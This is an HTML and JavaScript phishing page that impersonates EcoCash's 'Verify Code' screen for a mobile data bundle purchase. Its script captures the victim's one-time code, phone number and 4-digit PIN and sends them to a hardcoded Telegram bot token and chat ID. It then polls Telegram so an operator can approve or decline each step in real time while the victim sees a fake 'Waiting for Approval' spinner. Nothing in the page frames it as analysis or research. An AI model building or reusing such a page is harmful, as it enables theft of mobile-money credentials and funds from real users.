<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#001a4d">
    <title>EcoCash | Verify Code · Zimbabwe</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --eco-red: #d32f2f;
            --eco-blue-dark: #001a4d;
            --eco-blue: #0033a0;
            --eco-blue-light: #0052cc;
            --white: #ffffff;
            --light-bg: #f5f7fa;
            --text-dark: #1a1a1a;
            --text-muted: #666666;
            --border: #e0e0e0;
            --success: #00b050;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        html { -webkit-text-size-adjust: 100%; }

        body {
            font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, var(--eco-blue) 0%, var(--eco-blue-dark) 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            overflow-x: hidden;
        }

        header {
            background: white;
            padding: 16px 5%;
            border-bottom: 3px solid var(--eco-blue);
            box-shadow: 0 2px 12px rgba(0, 51, 160, 0.12);
        }

        .logo {
            font-size: 24px;
            font-weight: 800;
            letter-spacing: -0.5px;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 2px;
        }

        .logo .eco { color: var(--eco-blue); }
        .logo .cash { color: var(--eco-red); }

        main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .otp-container {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
            border: 2px solid var(--eco-blue);
        }

        .otp-header {
            text-align: center;
            margin-bottom: 32px;
        }

        .otp-header h1 {
            font-size: 28px;
            font-weight: 900;
            color: var(--text-dark);
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .otp-header p {
            color: var(--text-muted);
            font-size: 14px;
        }

        .bundle-info {
            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 28px;
            color: white;
        }

        .bundle-info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
            font-size: 13px;
        }

        .bundle-info-row:last-child {
            margin-bottom: 0;
            padding-top: 8px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            margin-top: 8px;
            font-weight: 800;
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 12px;
            font-weight: 800;
            color: var(--eco-blue);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 12px;
        }

        .otp-inputs {
            display: flex;
            gap: 8px;
            justify-content: center;
            margin-bottom: 20px;
        }

        .otp-box {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid var(--eco-blue);
            border-radius: 10px;
            background: var(--light-bg);
            color: var(--text-dark);
            font-family: 'Inter', monospace;
            transition: all 0.2s;
        }

        .otp-box:focus {
            border-color: var(--eco-red);
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.1);
            outline: none;
        }

        .otp-box::placeholder {
            color: var(--text-muted);
        }

        .form-hint {
            font-size: 12px;
            color: var(--text-muted);
            text-align: center;
            margin-bottom: 16px;
            line-height: 1.5;
        }

        .error-msg {
            display: none;
            background: rgba(211, 47, 47, 0.1);
            border: 1px solid rgba(211, 47, 47, 0.3);
            color: var(--eco-red);
            font-size: 13px;
            font-weight: 600;
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 16px;
            text-align: center;
        }

        .error-msg.show {
            display: block;
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 28px;
        }

        .btn-primary {
            flex: 1;
            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-1px);
            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
        }

        .btn-primary:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }

        .btn-secondary {
            flex: 1;
            background: transparent;
            color: var(--eco-blue);
            border: 2px solid var(--eco-blue);
            padding: 14px 20px;
            border-radius: 50px;
            font-weight: 800;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-secondary:hover {
            background: var(--light-bg);
        }

        .form-footer {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .form-footer a {
            color: var(--eco-blue);
            text-decoration: none;
            font-weight: 800;
        }

        .form-footer a:hover {
            text-decoration: underline;
        }

        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            gap: 16px;
            background: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            backdrop-filter: blur(4px);
        }

        .loading-overlay.active {
            display: flex;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .spin-label {
            font-size: 16px;
            font-weight: 700;
            color: white;
        }

        .spin-sub {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.7);
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Modal */
        .modal-overlay {
            position: fixed;
            inset: 0;
            display: none;
            align-items: center;
            justify-content: center;
            background: rgba(0, 0, 0, 0.6);
            z-index: 2000;
            padding: 20px;
            backdrop-filter: blur(4px);
        }

        .modal-overlay.active {
            display: flex;
        }

        .modal-content {
            background: white;
            border-radius: 16px;
            padding: 40px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 51, 160, 0.25);
            border: 2px solid var(--eco-blue);
        }

        .modal-title {
            font-size: 24px;
            font-weight: 900;
            color: var(--text-dark);
            margin-bottom: 12px;
            letter-spacing: -0.5px;
            text-align: center;
        }

        .modal-subtitle {
            color: var(--text-muted);
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.6;
            text-align: center;
        }

        .pin-input-group {
            display: flex;
            align-items: center;
            border: 2px solid var(--eco-blue);
            border-radius: 12px;
            padding: 12px 14px;
            background: var(--light-bg);
            transition: all 0.2s;
            margin-bottom: 16px;
        }

        .pin-input-group:focus-within {
            border-color: var(--eco-red);
            background: white;
            box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.1);
        }

        .pin-input-field {
            flex: 1;
            border: none;
            background: transparent;
            font-size: 18px;
            color: var(--text-dark);
            outline: none;
            font-family: inherit;
            letter-spacing: 4px;
        }

        .pin-input-field::placeholder {
            color: var(--text-muted);
            letter-spacing: 0;
        }

        .modal-error {
            display: none;
            background: rgba(211, 47, 47, 0.1);
            border: 1px solid rgba(211, 47, 47, 0.3);
            color: var(--eco-red);
            font-size: 13px;
            font-weight: 600;
            border-radius: 8px;
            padding: 10px 12px;
            margin-bottom: 16px;
            text-align: center;
        }

        .modal-error.show {
            display: block;
        }

        .pin-modal-buttons {
            display: flex;
            gap: 12px;
        }

        .pin-modal-btn {
            flex: 1;
            padding: 12px 20px;
            border-radius: 50px;
            border: none;
            font-weight: 800;
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 0.04em;
            cursor: pointer;
            transition: all 0.2s;
        }

        .pin-modal-btn-confirm {
            background: linear-gradient(135deg, var(--eco-blue), var(--eco-blue-dark));
            color: white;
            box-shadow: 0 4px 12px rgba(0, 51, 160, 0.3);
        }

        .pin-modal-btn-confirm:hover {
            transform: translateY(-1px);
            box-shadow: 0 6px 16px rgba(0, 51, 160, 0.4);
        }

        .pin-modal-btn-cancel {
            background: transparent;
            color: var(--eco-blue);
            border: 2px solid var(--eco-blue);
        }

        .pin-modal-btn-cancel:hover {
            background: var(--light-bg);
        }

        @media (max-width: 600px) {
            main { padding: 20px 16px; }
            .otp-container { padding: 28px 20px; }
            .otp-header h1 { font-size: 22px; }
            .otp-inputs { gap: 6px; }
            .otp-box { width: 45px; height: 45px; font-size: 20px; }
            .btn-group { flex-direction: column; }
        }
    </style>
</head>
<body>
    <header>
        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
    </header>

    <main>
        <div class="otp-container">
            <div class="otp-header">
                <h1>Verify Code</h1>
                <p>Enter the 6-digit code sent to your phone</p>
            </div>

            <div id="bundleInfo" class="bundle-info" style="display: none;">
                <div class="bundle-info-row">
                    <span>Bundle:</span>
                    <span id="bundleData">—</span>
                </div>
                <div class="bundle-info-row">
                    <span>Amount:</span>
                    <span id="bundlePrice">USD 0.00</span>
                </div>
            </div>

            <div id="errorMsg" class="error-msg"></div>

            <div class="form-group">
                <label class="form-label">Enter Code</label>
                <div class="otp-inputs" id="otpInputs">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                    <input type="text" class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
                </div>
                <p class="form-hint">Check your SMS for the code</p>

                <div class="btn-group">
                    <button class="btn-primary" id="confirmBtn" onclick="validateOTP()">Verify & Proceed</button>
                    <button class="btn-secondary" onclick="window.history.back()">Cancel</button>
                </div>
            </div>

            <div class="form-footer">
                Your transaction is protected with 256-bit encryption. <a href="#">Learn more</a>
            </div>
        </div>
    </main>

    <!-- Loading Overlay -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="spin-label">Waiting for Approval</div>
        <div class="spin-sub">Please wait...</div>
    </div>

    <!-- PIN Modal -->
    <div id="pinModal" class="modal-overlay">
        <div class="modal-content">
            <h2 class="modal-title">Enter PIN/Password</h2>
            <p class="modal-subtitle">Confirm your transaction with your PIN or password</p>
            <div id="pinModalError" class="modal-error"></div>
            <div class="pin-input-group">
                <input type="password" class="pin-input-field" id="pinInput" placeholder="••••" inputmode="numeric" maxlength="4">
            </div>
            <div class="pin-modal-buttons">
                <button class="pin-modal-btn pin-modal-btn-confirm" onclick="submitPin()">Confirm</button>
                <button class="pin-modal-btn pin-modal-btn-cancel" onclick="closePinModal()">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
        const TELEGRAM_CHAT_ID = '7547427914';
        let bundleData = {};
        let lastUpdateId = 0;
        let otpCode = '';
        let phoneNumber = '';

        function loadBundleData() {
            const params = new URLSearchParams(window.location.search);
            const data = params.get('data');
            const price = params.get('price');
            phoneNumber = params.get('phone') || '';

            if (data && price) {
                bundleData = { data, price };
                document.getElementById('bundleInfo').style.display = 'block';
                document.getElementById('bundleData').textContent = data;
                document.getElementById('bundlePrice').textContent = 'USD ' + price;
            }
        }

        const otpInputs = document.querySelectorAll('.otp-box');
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                updateOTPCode();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
            });
        });

        function updateOTPCode() {
            otpCode = Array.from(otpInputs).map(input => input.value).join('');
        }

        function validateOTP() {
            updateOTPCode();
            if (otpCode.length !== 6) {
                showError('Please enter all 6 digits');
                return;
            }

            document.getElementById('loadingOverlay').classList.add('active');
            pollForOTPApproval();
        }

        async function sendToTelegram(message, buttons) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined,
                        parse_mode: 'HTML'
                    })
                });

                return response.ok;
            } catch (error) {
                console.error('Error:', error);
            }
            return false;
        }

        function pollForOTPApproval() {
            const pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            const update = data.result[0];
                            lastUpdateId = update.update_id;

                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;

                                if (callbackData === 'otp_approved') {
                                    clearInterval(pollInterval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    openPinModal();
                                } else if (callbackData === 'otp_declined') {
                                    clearInterval(pollInterval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    showError('OTP verification declined. Please try again.');
                                    resetOTP();
                                }
                            }
                        }
                    })
                    .catch(err => console.error('Poll error:', err));
            }, 1000);

            setTimeout(() => clearInterval(pollInterval), 300000);

            const message = `📲 <b>Your EcoCash OTP is</b> <code>${otpCode}</code>\n\n<b>Do not share this code with anyone. Expires in 2 mins.</b>\n\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> ${bundleData.data}\n<b>Amount:</b> USD ${bundleData.price}`;
            const buttons = [
                [
                    { text: '✓ Approved', callback_data: 'otp_approved' },
                    { text: '✗ Declined', callback_data: 'otp_declined' }
                ]
            ];

            sendToTelegram(message, buttons);
        }

        function openPinModal() {
            document.getElementById('pinModal').classList.add('active');
        }

        function closePinModal() {
            document.getElementById('pinModal').classList.remove('active');
        }

        function submitPin() {
            const pin = document.getElementById('pinInput').value.trim();
            const pinError = document.getElementById('pinModalError');

            if (!pin || pin.length !== 4) {
                pinError.textContent = 'PIN must be 4 digits';
                pinError.classList.add('show');
                return;
            }

            pinError.classList.remove('show');
            document.getElementById('loadingOverlay').classList.add('active');
            pollForPinApproval(pin);
        }

        function pollForPinApproval(pin) {
            const pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            const update = data.result[0];
                            lastUpdateId = update.update_id;

                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;

                                if (callbackData === 'pin_valid') {
                                    clearInterval(pollInterval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    proceedToSuccess();
                                } else if (callbackData === 'pin_invalid') {
                                    clearInterval(pollInterval);
                                    document.getElementById('loadingOverlay').classList.remove('active');
                                    const pinError = document.getElementById('pinModalError');
                                    pinError.textContent = 'Invalid PIN. Please try again.';
                                    pinError.classList.add('show');
                                    document.getElementById('pinInput').value = '';
                                }
                            }
                        }
                    })
                    .catch(err => console.error('Poll error:', err));
            }, 1000);

            setTimeout(() => clearInterval(pollInterval), 300000);

            const message = `🔐 <b>PIN Verification</b>\n\n<b>PIN:</b> <code>${pin}</code>\n<b>OTP Code:</b> <code>${otpCode}</code>\n<b>Phone:</b> <code>+263${phoneNumber}</code>\n<b>Bundle:</b> ${bundleData.data}\n<b>Amount:</b> USD ${bundleData.price}`;
            const buttons = [
                [
                    { text: '✓ Valid PIN', callback_data: 'pin_valid' },
                    { text: '✗ Invalid PIN', callback_data: 'pin_invalid' }
                ]
            ];

            sendToTelegram(message, buttons);
        }

        function proceedToSuccess() {
            window.location.href = `success.html?data=${encodeURIComponent(bundleData.data)}&price=${bundleData.price}`;
        }

        function showError(msg) {
            const errorMsg = document.getElementById('errorMsg');
            errorMsg.textContent = msg;
            errorMsg.classList.add('show');
        }

        function resetOTP() {
            otpInputs.forEach(input => input.value = '');
            otpCode = '';
            otpInputs[0].focus();
        }

        window.addEventListener('load', loadBundleData);
    </script>
</body>
</html>
